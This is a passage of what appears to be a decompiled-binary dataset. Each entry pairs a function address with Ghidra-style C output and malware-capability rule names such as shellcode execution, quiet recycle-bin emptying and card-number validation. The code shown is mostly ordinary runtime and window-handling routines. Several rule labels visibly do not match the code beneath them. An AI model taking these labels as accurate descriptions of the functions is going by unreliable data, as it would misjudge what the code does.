code_r0x0040b974;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40ba98)) {\n                case 0x40bab0:\n                    goto code_r0x0040bab0;\n                case 0x40bac0:\n                    goto code_r0x0040bac0;\n                case 0x40bad4:\n                    goto code_r0x0040bad4;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x0040b80c;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x40b8fc\n        switch(*((arg_10h & 3) * 4 + 0x40b8fc)) {\n        case 0x40b914:\ncode_r0x0040b914:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x40b920:\ncode_r0x0040b920:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x40b934:\ncode_r0x0040b934:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x40b90c)) {\n        case 0x40b914:\n            goto code_r0x0040b914;\n        case 0x40b920:\n            goto code_r0x0040b920;\n        case 0x40b934:\n            goto code_r0x0040b934;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x40b810)) {\n        case 0x40b820:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x0040b80c:\n    // WARNING: Could not recover jumptable at 0x0040b80c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x40b890\n                puVar1 = (**(uVar2 * 4 + 0x40b890))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40b8fc)) {\n            case 0x40b914:\n                goto code_r0x0040b914;\n            case 0x40b920:\n                goto code_r0x0040b920;\n            case 0x40b934:\n                goto code_r0x0040b934;\n            }\n            break;\n        case 0x40b84c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x0040b80c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40b8fc)) {\n            case 0x40b914:\n                goto code_r0x0040b914;\n            case 0x40b920:\n                goto code_r0x0040b920;\n            case 0x40b934:\n                goto code_r0x0040b934;\n            }\n            break;\n        case 0x40b870:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x0040b80c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40b8fc)) {\n            case 0x40b914:\n                goto code_r0x0040b914;\n            case 0x40b920:\n                goto code_r0x0040b920;\n            case 0x40b934:\n                goto code_r0x0040b934;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2709
    },
    "0040bbe0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040bbe0(uint32_t *param_1, uint8_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    uVar1 = param_2;\n    puVar4 = param_1;\n    if (3 < param_3) {\n        uVar2 = -param_1 & 3;\n        uVar3 = param_3;\n        if (uVar2 != 0) {\n            uVar3 = param_3 - uVar2;\n            do {\n                *puVar4 = param_2;\n                puVar4 = puVar4 + 1;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        uVar1 = uVar1 * 0x1010101;\n        param_3 = uVar3 & 3;\n        uVar3 = uVar3 >> 2;\n        if (uVar3 != 0) {\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = uVar1;\n                puVar4 = puVar4 + 1;\n            }\n            if (param_3 == 0) {\n                return param_1;\n            }\n        }\n    }\n    do {\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        param_3 = param_3 - 1;\n    } while (param_3 != 0);\n    return param_1;\n}\n",
        "token_count": 387
    },
    "00431994": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00431994(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    if ((((param_2 != 0) && (param_2 != 6)) && (param_2 != 7)) && ((param_2 != 8 && (param_2 != 4)))) {\n        uVar1 = (*_sym.imp.USER32.dll_GetLastActivePopup)(*(param_1 + 0x1c));\n        (*_sym.imp.USER32.dll_BringWindowToTop)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004205dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl\nfcn.004205dc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    bool bVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpWindowName;\n    uint lpClassName;\n    uint dwExStyle;\n    \n    dwExStyle = arg_8h;\n    lpClassName = arg_ch;\n    lpWindowName = arg_10h;\n    var_10h = arg_14h;\n    var_14h = arg_18h;\n    var_18h = arg_1ch;\n    var_1ch = arg_20h;\n    var_20h = arg_24h;\n    var_24h = arg_28h;\n    var_28h = arg_2ch;\n    iVar1 = fcn.00434fe8();\n    var_2ch = *(iVar1 + 8);\n    var_30h = arg_30h;\n    iVar1 = (**(*in_ECX + 100))(&var_30h);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0x114))();\n        bVar3 = false;\n    }\n    else {\n        fcn.00420590();\n        iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                          (dwExStyle, lpClassName, lpWindowName, var_10h, var_14h, var_18h, var_1ch, var_20h, var_24h, \n                           var_28h, var_2ch, var_30h);\n        iVar2 = fcn.0041ef5f();\n        if (iVar2 == 0) {\n            (**(*in_ECX + 0x114))();\n        }\n        bVar3 = iVar1 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 523
    },
    "00415143": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415143(uint16_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_18h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = arg_8h[5];\n    var_ch = *(arg_8h + 3);\n    var_8h = *(arg_8h + 1);\n    var_4h = *arg_8h << 0x10;\n    uVar5 = uVar1 & 0x7fff;\n    iVar6 = uVar5 - 0x3fff;\n    if (iVar6 == -0x3fff) {\n        iVar6 = 0;\n        uVar5 = fcn.004150af();\n        uVar2 = uVar5;\n        if (uVar5 != 0) {\ncode_r0x0041525b:\n            uVar3 = 0;\n            goto code_r0x0041525d;\n        }\n    }\n    else {\n        fcn.00415094(&var_18h, &var_ch);\n        iVar4 = fcn.00415022(&var_ch, arg_10h[2]);\n        if (iVar4 != 0) {\n            iVar6 = uVar5 - 0x3ffe;\n        }\n        iVar4 = arg_10h[1];\n        if (iVar6 < iVar4 - arg_10h[2]) {\n            var_ch = 0;\n            var_8h = 0;\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n        else {\n            if (iVar4 < iVar6) {\n                if (*arg_10h <= iVar6) {\n                    var_8h = 0;\n                    var_4h = 0;\n                    var_ch = 0x80000000;\n                    fcn.004150c8(&var_ch, arg_10h[3]);\n                    iVar6 = arg_10h[5] + *arg_10h;\n                    uVar3 = 1;\n                    goto code_r0x0041525d;\n                }\n                var_ch = var_ch & 0x7fffffff;\n                iVar6 = arg_10h[5] + iVar6;\n                fcn.004150c8(&var_ch, arg_10h[3]);\n                goto code_r0x0041525b;\n            }\n            fcn.00415094(&var_ch, &var_18h);\n            fcn.004150c8(&var_ch, iVar4 - iVar6);\n            fcn.00415022(&var_ch, arg_10h[2]);\n            fcn.004150c8(&var_ch, arg_10h[3] + 1);\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n    }\n    var_8h = uVar2;\n    var_ch = uVar5;\n    iVar6 = 0;\n    uVar3 = 2;\ncode_r0x0041525d:\n    var_ch = iVar6 << (0x1fU - arg_10h[3] & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | var_ch;\n    if (arg_10h[4] == 0x40) {\n        arg_ch[1] = var_ch;\n        *arg_ch = var_8h;\n    }\n    else if (arg_10h[4] == 0x20) {\n        *arg_ch = var_ch;\n    }\n    return uVar3;\n}\n",
        "token_count": 856
    },
    "0041678f": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041678f(char *arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_10h;\n    var_4h = *0x44e0fc;\n    iVar1 = 0x404e;\n    *arg_10h = 0;\n    arg_10h[1] = 0;\n    arg_10h[2] = 0;\n    if (arg_ch != 0) {\n        arg_10h = arg_ch;\n        do {\n            var_10h = *puVar2;\n            var_ch = puVar2[1];\n            var_8h = puVar2[2];\n            fcn.00416734(puVar2);\n            fcn.00416734(puVar2);\n            fcn.004166d6(puVar2, &var_10h);\n            fcn.00416734(puVar2);\n            var_10h = *arg_8h;\n            var_ch = 0;\n            var_8h = 0;\n            fcn.004166d6(puVar2, &var_10h);\n            arg_8h = arg_8h + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != NULL);\n    }\n    if (puVar2[2] == 0) {\n        do {\n            iVar1 = iVar1 + -0x10;\n            uVar3 = puVar2[1] >> 0x10;\n            puVar2[1] = *puVar2 >> 0x10 | puVar2[1] << 0x10;\n            *puVar2 = *puVar2 << 0x10;\n        } while (uVar3 == 0);\n        puVar2[2] = uVar3;\n    }\n    while ((puVar2[2] & 0x8000) == 0) {\n        fcn.00416734(puVar2);\n        iVar1 = iVar1 + -1;\n    }\n    *(puVar2 + 10) = iVar1;\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 554
    },
    "0041a6f5": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a6f5(int32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_18h;\n    uint var_10h;\n    uint32_t lpPoint;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    puVar3 = arg_ch;\n    puVar4 = &var_24h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_24h = (*_sym.imp.USER32.dll_SendMessageA)(*(arg_8h + 0x1c), 0x410, 0, &var_10h);\n    lpPoint = arg_ch[5];\n    var_4h = arg_ch[6];\n    if ((0x1ff < var_20h) && (var_20h < 0x20a)) {\n        (*_sym.imp.USER32.dll_ScreenToClient)(var_24h, &lpPoint);\n    }\n    var_18h = lpPoint & 0xffff | var_4h << 0x10;\n    (*pcVar1)(*(arg_8h + 0x1c), 0x407, 0, &var_24h);\n    return;\n}\n",
        "token_count": 373
    },
    "00427dae": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427dae(uint arg_8h)\n\n{\n    uint var_18h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    fcn.00427d22(arg_8h, &var_18h);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 87
    },
    "00427ed2": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00427ed2(uint arg_8h, uint *arg_ch, uint32_t *arg_10h, uint *arg_14h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    fcn.00427d22(arg_8h, &var_18h);\n    *arg_ch = var_14h;\n    *arg_10h = var_10h << 0x10 | var_10h._1_1_;\n    *arg_14h = var_18h;\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 174
    },
    "00432f18": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00432f18(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x11);\n    if (iVar2 < 0) {\n        uVar7 = 8;\n    }\n    else {\n        uVar7 = 0;\n    }\n    iVar2 = (*pcVar1)(0x10);\n    if (iVar2 < 0) {\n        uVar3 = 4;\n    }\n    else {\n        uVar3 = 0;\n    }\n    iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n    iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    if (iVar4 == 0) {\n        iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x20a, arg_8h << 0x10 | uVar7 | uVar3, arg_ch);\n    }\n    else {\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(iVar4, 0x20a, arg_8h << 0x10 | uVar7 | uVar3, arg_ch);\n            iVar4 = (*_sym.imp.USER32.dll_GetParent)(iVar4);\n            if (iVar6 != 0) {\n                return iVar6;\n            }\n            if (iVar4 == 0) {\n                return 0;\n            }\n        } while (iVar4 != iVar5);\n    }\n    return iVar6;\n}\n",
        "token_count": 420
    },
    "00436b52": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436b52(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x1c));\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (iVar2 == 0) {\n        *(in_ECX + 0xa8) = arg_8h;\n        *(in_ECX + 0xac) = arg_ch;\n        *(in_ECX + 0xa0) = arg_10h;\n        *(in_ECX + 0xa4) = arg_14h;\n    }\n    else {\n        (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x420, 0, arg_10h & 0xffff | arg_14h << 0x10);\n        (*pcVar1)(*(in_ECX + 0x1c), 0x41f, 0, arg_8h & 0xffff | arg_ch << 0x10);\n        (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), 0, 1);\n    }\n    return;\n}\n",
        "token_count": 313
    },
    "004137a0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.004137a0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t uVar28;\n    uint32_t uVar29;\n    uint32_t uVar30;\n    uint32_t uVar31;\n    uint32_t uVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    uint32_t uVar35;\n    uint32_t uVar36;\n    uint32_t uVar37;\n    uint32_t uVar38;\n    uint32_t uVar39;\n    uint32_t uVar40;\n    uint32_t uVar41;\n    uint32_t uVar42;\n    uint32_t uVar43;\n    uint32_t uVar44;\n    uint32_t arg_ch;\n    int32_t unaff_ESI;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x451496;\n    arg_ch = *0x451498;\n    if (unaff_ESI == 0) {\n        return 0xffffffff;\n    }\n    uVar2 = fcn.0041643e(1, uVar1, 0x31, unaff_ESI + 4);\n    uVar3 = fcn.0041643e(1, uVar1, 0x32, unaff_ESI + 8);\n    uVar4 = fcn.0041643e(1, uVar1, 0x33, unaff_ESI + 0xc);\n    uVar5 = fcn.0041643e(1, uVar1, 0x34, unaff_ESI + 0x10);\n    uVar6 = fcn.0041643e(1, uVar1, 0x35, unaff_ESI + 0x14);\n    uVar7 = fcn.0041643e(1, uVar1, 0x36, unaff_ESI + 0x18);\n    uVar8 = fcn.0041643e(1, uVar1, 0x37, unaff_ESI);\n    uVar9 = fcn.0041643e(1, uVar1, 0x2a, unaff_ESI + 0x20);\n    uVar10 = fcn.0041643e(1, uVar1, 0x2b, unaff_ESI + 0x24);\n    uVar11 = fcn.0041643e(1, uVar1, 0x2c, unaff_ESI + 0x28);\n    uVar12 = fcn.0041643e(1, uVar1, 0x2d, unaff_ESI + 0x2c);\n    uVar13 = fcn.0041643e(1, uVar1, 0x2e, unaff_ESI + 0x30);\n    uVar14 = fcn.0041643e(1, uVar1, 0x2f, unaff_ESI + 0x34);\n    uVar15 = fcn.0041643e(1, uVar1, 0x30, unaff_ESI + 0x1c);\n    uVar16 = fcn.0041643e(1, uVar1, 0x44, unaff_ESI + 0x38);\n    uVar17 = fcn.0041643e(1, uVar1, 0x45, unaff_ESI + 0x3c);\n    uVar18 = fcn.0041643e(1, uVar1, 0x46, unaff_ESI + 0x40);\n    uVar19 = fcn.0041643e(1, uVar1, 0x47, unaff_ESI + 0x44);\n    uVar20 = fcn.0041643e(1, uVar1, 0x48, unaff_ESI + 0x48);\n    uVar21 = fcn.0041643e(1, uVar1, 0x49, unaff_ESI + 0x4c);\n    uVar22 = fcn.0041643e(1, uVar1, 0x4a, unaff_ESI + 0x50);\n    uVar23 = fcn.0041643e(1, uVar1, 0x4b, unaff_ESI + 0x54);\n    uVar24 = fcn.0041643e(1, uVar1, 0x4c, unaff_ESI + 0x58);\n    uVar25 = fcn.0041643e(1, uVar1, 0x4d, unaff_ESI + 0x5c);\n    uVar26 = fcn.0041643e(1, uVar1, 0x4e, unaff_ESI + 0x60);\n    uVar27 = fcn.0041643e(1, uVar1, 0x4f, unaff_ESI + 100);\n    uVar28 = fcn.0041643e(1, uVar1, 0x38, unaff_ESI + 0x68);\n    uVar29 = fcn.0041643e(1, uVar1, 0x39, unaff_ESI + 0x6c);\n    uVar30 = fcn.0041643e(1, uVar1, 0x3a, unaff_ESI + 0x70);\n    uVar31 = fcn.0041643e(1, uVar1, 0x3b, unaff_ESI + 0x74);\n    uVar32 = fcn.0041643e(1, uVar1, 0x3c, unaff_ESI + 0x78);\n    uVar33 = fcn.0041643e(1, uVar1, 0x3d, unaff_ESI + 0x7c);\n    uVar34 = fcn.0041643e(1, uVar1, 0x3e, unaff_ESI + 0x80);\n    uVar35 = fcn.0041643e(1, uVar1, 0x3f, unaff_ESI + 0x84);\n    uVar36 = fcn.0041643e(1, uVar1, 0x40, unaff_ESI + 0x88);\n    uVar37 = fcn.0041643e(1, uVar1, 0x41, unaff_ESI + 0x8c);\n    uVar38 = fcn.0041643e(1, uVar1, 0x42, unaff_ESI + 0x90);\n    uVar39 = fcn.0041643e(1, uVar1, 0x43, unaff_ESI + 0x94);\n    uVar40 = fcn.0041643e(1, uVar1, 0x28, unaff_ESI + 0x98);\n    uVar1 = fcn.0041643e(1, uVar1, 0x29, unaff_ESI + 0x9c);\n    uVar41 = fcn.0041643e(1, arg_ch, 0x1f, unaff_ESI + 0xa0);\n    uVar42 = fcn.0041643e(1, arg_ch, 0x20, unaff_ESI + 0xa4);\n    uVar43 = fcn.0041643e(1, arg_ch, 0x1003, unaff_ESI + 0xa8);\n    uVar44 = fcn.0041643e(0, arg_ch, 0x1009, unaff_ESI + 0xb0);\n    *(unaff_ESI + 0xac) = arg_ch;\n    return uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 | uVar14 |\n           uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 | uVar22 | uVar23 | uVar24 | uVar25 | uVar26 |\n           uVar27 | uVar28 | uVar29 | uVar30 | uVar31 | uVar32 | uVar33 | uVar34 | uVar35 | uVar36 | uVar37 | uVar38 |\n           uVar39 | uVar40 | uVar1 | uVar41 | uVar42 | uVar43 | uVar44;\n}\n",
        "token_count": 2145
    },
    "00418a59": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418a59(int32_t *param_1)\n\n{\n    int32_t *arg_ch;\n    \n    if (param_1[0x14] != 0) {\n        if (param_1[0x15] < 0x10) {\n            arg_ch = param_1 + 0x10;\n        }\n        else {\n            arg_ch = param_1[0x10];\n        }\n        fcn.0040fa5f(0, arg_ch);\n    }\n    fcn.00402700(1, 0);\n    fcn.00402700(1, 0);\n    fcn.00402700(1, 0);\n    fcn.00402700(1, 0);\n    fcn.00419327(*param_1 * 0x18 + 0x4514e0);\n    return;\n}\n",
        "token_count": 193
    },
    "00406340": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00406340(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    bool bVar8;\n    uint uStack44;\n    int32_t iStack40;\n    char *pcStack36;\n    int32_t iStack32;\n    int32_t iVar9;\n    int32_t iStack12;\n    uint uStack8;\n    int32_t iStack4;\n    \n    iStack12 = *in_FS_OFFSET;\n    iStack4 = 0xffffffff;\n    uStack8 = 0x43ae92;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    if (param_2 == NULL) {\n        iStack32 = 0;\n    }\n    else {\n        pcVar2 = param_2;\n        do {\n            cVar1 = *pcVar2;\n            pcVar2 = pcVar2 + 1;\n        } while (cVar1 != '\\0');\n        iStack32 = pcVar2 - (param_2 + 1);\n    }\n    pcStack36 = param_2;\n    iStack40 = 0x406380;\n    fcn.00402f80();\n    iStack40 = 0x18;\n    uStack44 = 0x406387;\n    iStack4 = fcn.0041bab6();\n    iStack12 = 0;\n    if (iStack4 == 0) {\n        uVar3 = 0;\n    }\n    else {\n        uStack44 = 0x4063a2;\n        iStack40 = param_1;\n        uVar3 = fcn.00406800();\n    }\n    uStack44 = 0;\n    iVar9 = -1;\n    *(param_1 + 0x58) = uVar3;\n    iVar4 = fcn.0043a55a(0);\n    if (iVar4 != 0) {\n        iVar9 = iVar9 + 700;\n        iVar4 = unaff_EBP;\n        iVar7 = iVar9;\n        iVar5 = fcn.00439e8a(unaff_EBP, iVar9);\n        while( true ) {\n            if (iVar5 != 0) {\n                iStack32 = fcn.0041bab6(0x18);\n                iStack40 = 1;\n                if (iStack32 == 0) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = fcn.00439d48(*(param_1 + 0x58), 1);\n                }\n                iStack40 = 0xffffffff;\n                *(param_1 + 0x5c) = uVar3;\n                iStack32 = fcn.0041bab6(0x48);\n                iStack40 = 2;\n                if (iStack32 == 0) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = fcn.004251f1(*(param_1 + 0x5c), 1, 0x1000, 0);\n                }\n                iStack40 = 0xffffffff;\n                *(param_1 + 0x60) = uVar3;\n                iStack32 = fcn.0041bab6(0x48);\n                iStack40 = 3;\n                if (iStack32 == 0) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = fcn.004251f1(*(param_1 + 0x5c), 0, 0x1000, 0);\n                }\n                iStack40 = 0xffffffff;\n                *(param_1 + 100) = uVar3;\n                piVar6 = fcn.0041bc88();\n                iStack32 = (**(*piVar6 + 0xc))();\n                iStack32 = iStack32 + 0x10;\n                iStack40 = 4;\n                iVar9 = fcn.0041bbfb(0x7d68);\n                if ((iVar9 != 0) && (iVar9 = fcn.00402e20(iVar9, 0x7d68),  iVar9 != 0)) {\n                    fcn.00403e60(&stack0xffffffd4);\n                }\n                LOCK();\n                iVar9 = *0x3b + -1;\n                iVar7 = *0x3b + -1;\n                bVar8 = *0x3b == 1;\n                *0x3b = iVar9;\n                if (bVar8 || iVar7 < 0) {\n                    (**(**0x2f + 4))(0x2f);\n                }\n                *in_FS_OFFSET = iVar4;\n                return 1;\n            }\n            iVar4 = fcn.00427980(0x7d67, 4, 0xffffffff);\n            if (iVar4 == 7) break;\n            iVar4 = unaff_EBP;\n            iVar5 = fcn.00439e8a(unaff_EBP, iVar9);\n        }\n        if (*(param_1 + 0x58) != NULL) {\n            (**(**(param_1 + 0x58) + 4))(1);\n        }\n        *(param_1 + 0x58) = 0;\n        *in_FS_OFFSET = iVar7;\n        return 0;\n    }\n    if (*(param_1 + 0x58) != NULL) {\n        (**(**(param_1 + 0x58) + 4))(1);\n    }\n    *(param_1 + 0x58) = 0;\n    fcn.00427980(0x7d66, 0, 0xffffffff);\n    *in_FS_OFFSET = 1;\n    return 0;\n}\n",
        "token_count": 1308
    },
    "0040cd90": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.0040cd90(uint32_t *arg_8h)\n\n{\n    uint32_t *arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    int64_t iVar5;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar3 = arg_8h[1];\n    if (((uVar3 < 0) || (0x1000 < uVar3)) || ((0xfff < uVar3 && (*arg_8h != 0)))) {\n        arg_8h_00 = NULL;\n    }\n    else {\n        fcn.00413524();\n        uVar3 = arg_8h[1];\n        uVar2 = *arg_8h;\n        if ((uVar3 < 0) || ((uVar3 < 1 && (uVar2 < 0x3f481)))) {\n            arg_8h_00 = fcn.00412d18(arg_8h);\n            if ((*0x44e69c == 0) || (iVar1 = fcn.00413570(arg_8h_00),  iVar1 == 0)) {\n                uVar3 = *arg_8h_00;\n                var_8h = uVar3 - *0x44e698;\n                var_4h = ((uVar3 >> 0x1f) - (*0x44e698 >> 0x1f)) - (uVar3 < *0x44e698);\n            }\n            else {\n                uVar2 = *0x44e698 + *0x44e6a0;\n                uVar3 = *arg_8h_00;\n                var_8h = uVar3 - uVar2;\n                var_4h = ((uVar3 >> 0x1f) - (uVar2 >> 0x1f)) - (uVar3 < uVar2);\n                arg_8h_00[8] = 1;\n            }\n            uVar3 = fcn.004135b0(var_8h, var_4h, 0x3c, 0);\n            